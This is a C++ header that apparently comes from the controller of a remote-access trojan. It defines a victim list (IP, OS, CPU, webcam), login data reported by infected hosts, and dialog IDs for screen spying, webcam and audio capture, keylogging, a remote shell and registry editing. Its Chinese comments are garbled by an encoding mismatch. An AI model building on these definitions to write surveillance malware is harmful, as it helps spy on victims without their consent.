#pragma once

//�б�ö��
enum
{
	ONLINELIST_IP = 0,          //IP����˳��
	ONLINELIST_ADDR,          //��ַ
	ONLINELIST_COMPUTER_NAME, //�������/��ע
	ONLINELIST_OS,           //����ϵͳ
	ONLINELIST_CPU,          //CPU
	ONLINELIST_VIDEO,       //����ͷ
	ONLINELIST_PING          //PING
};

//�����������б�Ľṹ
typedef struct
{
	char	*title;   //�б������
	int		nWidth;   //�б�Ŀ��
}COLUMNSTRUCT;

//�Զ�����Ϣö��
enum
{
	UM_ICONNOTIFY = WM_USER + 0x100,
};

enum
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,


	WM_ADDTOLIST = WM_USER + 102,	// ��ӵ��б���ͼ��
	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
	WM_OPENMANAGERDIALOG,			// ��һ���ļ�������
	WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
	WM_OPENAUDIODIALOG,				// ��һ��������������
	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
	WM_OPENPSLISTDIALOG,			// �򿪽��̹�����
	WM_OPENSHELLDIALOG,				// ��shell����
	WM_OPENSERVERDIALOG,			// �򿪷��񴰿�
	WM_OPENREGEDITDIALOG,           // ��ע��������
	WM_RESETPORT,					// �ı�˿�
	//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,			// �ļ�����
	SCREENSPY_DLG,					// ��Ļ
	WEBCAM_DLG,						
	AUDIO_DLG,						// ��������
	KEYBOARD_DLG,					// ���� 
	SYSTEM_DLG,						// ����
	SHELL_DLG,						// shell����
	SERVER_DLG,						// �������
	REGEDIT_DLG                     // ע������
};


typedef struct
{
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
}LOGININFO;

typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
#ifdef _UNICODE
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#endif
